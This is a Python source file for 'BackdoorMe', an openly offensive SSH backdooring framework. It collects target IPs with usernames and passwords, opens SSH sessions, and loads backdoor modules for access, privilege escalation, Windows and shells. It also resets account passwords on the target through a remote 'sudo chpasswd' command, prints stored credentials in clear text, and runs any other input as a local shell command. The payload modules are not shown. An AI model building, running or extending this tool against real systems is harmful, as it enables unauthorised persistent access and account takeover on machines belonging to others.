#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import socket
import subprocess
import getpass
import cmd
import importlib
import inspect
import sys
import traceback

try:
    from colorama import Fore, init
    init(autoreset=True)
    GOOD = Fore.GREEN + " + " + Fore.RESET
    BAD = Fore.RED + " - " + Fore.RESET
    WARN = Fore.YELLOW + " * " + Fore.RESET
    INFO = Fore.BLUE + " + " + Fore.RESET
    OPEN = Fore.GREEN + "open" + Fore.RESET
    CLOSED = Fore.RED + "closed" + Fore.RESET
except ImportError:
    GOOD = " + "
    BAD = " - "
    WARN = " * "
    INFO = " + "
    OPEN = "open"
    CLOSED = "closed"

try:
    import target
except ImportError:
    print("Warning: target module not found.")
    target = None

try:
    from backdoors import *
except ImportError:
    pass

try:
    from modules import *
    enabled_modules = {}
except ImportError:
    enabled_modules = {}

try:
    from start import ascii
except ImportError:
    def ascii():
        print("=== BackdoorMe SSH Framework ===")

sys.path.append("backdoors")
sys.path.append("modules")


class BackdoorMe(cmd.Cmd):
    prompt = INFO + ">> " + GOOD if GOOD != " + " else ">> "

    def __init__(self):
        cmd.Cmd.__init__(self)
        self.enabled_modules = enabled_modules
        self.target_num = 1
        self.port = 22
        self.targets = {}
        self.curtarget = None
        try:
            proc = subprocess.run(
                "ip route get 1 | awk '{print $7; exit}'",
                shell=True, capture_output=True, text=True
            )
            self.localIP = proc.stdout.strip() or "127.0.0.1"
        except Exception:
            self.localIP = "127.0.0.1"
        self.ctrlc = False
        ascii()
        print('Welcome to BackdoorMe, a powerful backdooring utility. Type "help" to see commands.')
        print('Type "addtarget" to set a target, and "open" to open an SSH connection to that target.')
        print("Using local IP of %s." % self.localIP)

    def print_help(self, lst):
        it = iter(lst)
        for x in it:
            print("{0:<20} {1:<25}".format(x, next(it)))

    def do_help(self, args):
        print('Type "addtarget" to set a target, and "open" to open an SSH connection to that target.')
        print("Using local IP of %s." % self.localIP)
        print("\nAvailable commands are: ")
        print("=======================")
        self.print_help([
            "addtarget", "adds a target",
            "change_ip <IP>", "changes local IP used by backdoors",
            "change_port <PORT>", "changes SSH port of current target",
            "close", "closes an existing SSH connection to target",
            "edittarget", "edit existing target",
            "history", "displays command history",
            "list", "lists targets, backdoors, and modules",
            "open", "opens an SSH connection to the target",
            "quit", "exits backdoorme",
            "set target <#>", "set the current target to given number",
            "use <BACKDOOR>", "loads given backdoor for exploit",
        ])

    def addtarget(self, hostname, uname, pword):
        if target is None:
            print(BAD + "target module not available.")
            return
        t = target.Target(hostname, uname, pword, self.target_num)
        self.targets[self.target_num] = t
        self.target_num += 1
        self.curtarget = t

    def get_target_info(self):
        hostname = input("Target Hostname: ").strip()
        try:
            socket.inet_aton(hostname)
        except socket.error:
            print(BAD + "Invalid IP Address.")
            return None, None, None
        uname = input("Username: ").strip()
        pword = getpass.getpass()
        return hostname, uname, pword

    def do_addtarget(self, args):
        hostname, uname, pword = self.get_target_info()
        if hostname is None:
            return
        print(GOOD + "Target %d Set!" % self.target_num)
        self.addtarget(hostname, uname, pword)

    def do_edittarget(self, args):
        t = self.get_target(args, connect=False)
        if t is None:
            return
        hostname, uname, pword = self.get_target_info()
        if hostname is None:
            return
        t.hostname = hostname
        t.uname = uname
        t.pword = pword
        print(GOOD + "Target edited")

    def do_set(self, args):
        if len(args.split()) == 0 or args.split()[0] != "target":
            print(BAD + 'Usage is "set target <target-num>"')
            return
        t = self.get_target(args, connect=False)
        if t is None:
            return
        self.curtarget = t
        print(GOOD + "Current target set to %s" % args.split()[-1])

    def open_conn(self, t):
        try:
            t.conn()
        except Exception:
            print(BAD + "Connection failed.")
            return
        print(GOOD + "Connection established.")

    def do_open(self, args):
        t = self.get_target(args)
        if t is None:
            return

    def do_close(self, args):
        t = self.get_target(args)
        if t is None:
            return
        try:
            t.close()
        except Exception:
            print(BAD + "Connection could not be closed.")
            return
        print(GOOD + "Connection closed.")

    def get_target(self, args, connect=True):
        t = self.curtarget
        parts = args.split()
        if (len(parts) == 1 and not parts[-1].isdigit()) or len(parts) == 0:
            if self.curtarget is None:
                print(BAD + "No currently set target. Add a target with 'addtarget'.")
                return None
            else:
                print(GOOD + "Using current target %d." % t.target_num)
        elif not self.target_exists(int(parts[-1])):
            print(BAD + "No target with that target ID found.")
            return None
        else:
            print(GOOD + "Using target %s" % parts[-1])
            t = self.targets[int(parts[-1])]
        if not t.is_open and connect:
            print(BAD + "No SSH connection to target. Attempting to open a connection...")
            self.open_conn(t)
        return t

    def target_exists(self, num):
        return num in self.targets

    def do_use(self, args):
        try:
            bd = args.split()[0]
            loc, bd = bd.rsplit("/", 1)
            if "backdoors/" + loc not in sys.path:
                sys.path.insert(0, "backdoors/" + loc)
            mod = importlib.import_module(bd)
            t = self.get_target(args)
            if t is None:
                return
            clsmembers = inspect.getmembers(sys.modules[bd], inspect.isclass)
            try:
                [m for m in clsmembers if m[1].__module__ == bd][0][1](self).cmdloop()
            except Exception as e:
                print(BAD + "An unexpected error occurred.")
                print(str(e))
                traceback.print_exc()
        except Exception as e:
            print(BAD + args + " backdoor cannot be found.")
            print(str(e))
            traceback.print_exc()

    def do_passwd(self, args):
        t = self.get_target(args)
        if t is None:
            return
        if not t.is_open:
            print(BAD + 'No SSH connection to target. Run "open" to start a connection.')
            return
        username = input(" + Enter the username: ").strip()
        password = input(" + Enter the new password: ").strip()
        t.ssh.exec_command("echo '%s:%s' | sudo chpasswd" % (username, password))
        print("Changing %s password..." % username)

    def do_change_ip(self, args):
        newIP = input("Please input the IP you want to use: ").strip()
        try:
            socket.inet_aton(newIP)
            self.localIP = newIP
        except socket.error:
            print(BAD + "Invalid IP Address.")
            return
        print(GOOD + "Local IP is now: " + newIP)

    def do_change_port(self, args):
        t = self.get_target(args)
        if t is None:
            return
        newPort = input("Please enter the port you want to use for future connections: ").strip()
        t.port = newPort
        print(GOOD + "SSH Port for target is now: " + t.port)
        if input("Enter y to restart SSH connection with new port now: ").strip() == "y":
            self.do_close(args)
            self.do_open(args)

    def do_quit(self, args):
        self.quit()

    def do_clear(self, args):
        os.system("clear")

    def walk(self, folder, echo=True):
        bds = []
        if echo:
            print(" " + INFO + folder.replace("backdoors/", ""))
        for root, dirs, files in os.walk(folder):
            del dirs[:]
            path = root.split("/")
            for file in files:
                if file[-3:] == ".py":
                    bds.append(str(file).replace(".py", ""))
                    if echo:
                        print(len(path) * "  " + "- " + str(file).replace(".py", ""))
        return bds

    def complete_use(self, text, line, begin_index, end_index):
        line = line.rsplit(" ")[1]
        segment = line.split("/")
        if len(segment) == 1:
            categories = ["access/", "escalation/", "windows/", "shell/", "auxiliary/"]
            return [item for item in categories if item.startswith(text)]
        if len(segment) == 2:
            bds = self.walk("backdoors/" + segment[0], echo=False)
            return [item for item in bds if item.startswith(text)]

    def do_list(self, args):
        if args == "targets" or len(args) == 0:
            print(GOOD + "Targets: ")
            target_list = list(self.targets.values())
            for num, t in self.targets.items():
                active = WARN if t == self.curtarget else " * "
                print(" " + active + "%s - %s %s:%s - %s" % (
                    num, t.hostname, t.uname, t.pword,
                    OPEN if t.is_open else CLOSED
                ))
        if args == "modules" or len(args) == 0:
            print(GOOD + "Available modules: ")
            for mod in sorted(self.enabled_modules.keys()):
                print("  * " + mod)
        if args == "backdoors" or len(args) == 0:
            print(GOOD + "Available backdoors: ")
            self.walk("backdoors/access")
            self.walk("backdoors/escalation")
            self.walk("backdoors/windows")
            self.walk("backdoors/shell")
            self.walk("backdoors/auxiliary")
        if len(args) != 0 and args not in ("targets", "backdoors", "modules"):
            print(BAD + "Unknown option " + args)

    def preloop(self):
        cmd.Cmd.preloop(self)
        self._hist = []
        self._locals = {}
        self._globals = {}

    def do_history(self, args):
        print(self._hist)

    def do_exit(self, args):
        self.quit()

    def precmd(self, line):
        self._hist += [line.strip()]
        self.ctrlc = False
        return line

    def default(self, line):
        try:
            print(GOOD + 'Executing "' + line + '"')
            os.system(line)
        except Exception as e:
            print(str(e.__class__) + ": " + str(e))

    def cmdloop(self):
        try:
            cmd.Cmd.cmdloop(self)
        except KeyboardInterrupt:
            if not self.ctrlc:
                self.ctrlc = True
                print("\n" + BAD + 'Please run "quit" or "exit" to exit, or press Ctrl-C again.')
                self.cmdloop()
            else:
                print("")
                self.quit()

    def do_EOF(self, line):
        print("")
        return True

    def emptyline(self):
        return

    def quit(self):
        print(BAD + "Exiting...")
        sys.exit(0)


def main():
    BackdoorMe().cmdloop()


if __name__ == "__main__":
    main()
